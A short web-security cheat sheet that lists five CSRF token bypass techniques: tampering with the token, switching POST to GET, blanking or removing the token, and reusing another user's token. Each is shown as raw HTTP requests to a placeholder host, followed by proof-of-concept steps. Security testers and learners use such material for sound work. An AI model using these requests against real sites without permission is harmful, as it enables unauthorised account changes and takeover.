If the session cookie’s SameSite value is set to none and the `referer` header is not being used for CSRF protection, then there is probably a CSRF token in place. The following are common CSRF token bypasses.

<br/>

**1) Change Single Character to Check if CSRF Token is Being Validated or Not**
```
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=S97qjrvFPqdndlqAidWFbHCldtb2RFP8;

email=test%40test.com&csrf=EFd9BZX3mI6LgxnzJgaa42YMHORbcVBA
```

<br/>

```
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=S97qjrvFPqdndlqAidWFbHCldtb2RFP8;

email=test%40test.com&csrf=EFd9BZX3mI6LgxnzJgaa42YMHORbcVBB
```

<br/>
<br/>

**2) Change Request Method from POST to GET**
```
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=S97qjrvFPqdndlqAidWFbHCldtb2RFP8;

email=test%40test.com&csrf=EFd9BZX3mI6LgxnzJgaa42YMHORbcVBA
```

<br/>

```
GET /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=S97qjrvFPqdndlqAidWFbHCldtb2RFP8;

email=test%40test.com&csrf=EFd9BZX3mI6LgxnzJgaa42YMHORbcVBA
```

<br/>
<br/>

**3) Remove value in CSRF token**
```
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=S97qjrvFPqdndlqAidWFbHCldtb2RFP8;

email=test%40test.com&csrf=EFd9BZX3mI6LgxnzJgaa42YMHORbcVBA
```

<br/>

```
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=S97qjrvFPqdndlqAidWFbHCldtb2RFP8;

email=test%40test.com&csrf=
```

<br/>
<br/>

**4) Remove CSRF Token Completely**
```
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=S97qjrvFPqdndlqAidWFbHCldtb2RFP8;

email=test%40test.com&csrf=EFd9BZX3mI6LgxnzJgaa42YMHORbcVBA
```

<br/>

```
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=S97qjrvFPqdndlqAidWFbHCldtb2RFP8;

email=test%40test.com
```

<br/>
<br/>

**5) Send a Valid CSRF Token from Another User**
Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.
```
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=S97qjrvFPqdndlqAidWFbHCldtb2RFP8;

email=test%40test.com&csrf=EFd9BZX3mI6LgxnzJgaa42YMHORbcVBA
```

<br/>

```
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=S97qjrvFPqdndlqAidWFbHCldtb2RFP8;

email=test%40test.com&csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY
```

<br/>

*Steps*
```
1. Capture a CSRF attack POST request
2. Send request to repeater
3. Drop the request (dropping the request means the CSRF token will not be used, meaning the token is still in the CSRF token pool)
4. Create a CSRF PoC
5. Use the CSRF token in the repeater tab in the CSRF PoC
```
